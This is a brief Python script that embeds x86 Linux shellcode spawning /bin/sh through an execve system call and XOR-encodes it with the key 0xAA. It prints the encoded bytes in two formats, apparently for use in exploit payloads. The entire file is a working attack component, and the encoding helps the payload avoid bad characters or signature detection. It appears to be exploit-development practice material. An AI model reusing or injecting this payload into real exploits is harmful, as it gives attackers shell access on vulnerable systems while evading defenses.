#!/usr/bin/python
import sys

shellcode = (
"\xeb\x1b\x5e\x31\xdb\x88\x5e\x07\x89\x76\x08\x89\x5e\x0c\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\x31\xc0\xb0\x0b\xcd\x80\x56\xe8\xe0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"
)

key = 0xAA;

encoded = ""
encoded2 = ""

for x in bytearray(shellcode):
    y = x^key
    encoded += '\\x'
    encoded += '%02x' % y

    encoded2 += '0x'
    encoded2 += '%02x,' % y

print('\nEncoded Shellcode (Length: %d):\n------------------\n' % len(bytearray(shellcode)))
print(encoded + "\n")
print(encoded2[:-1])
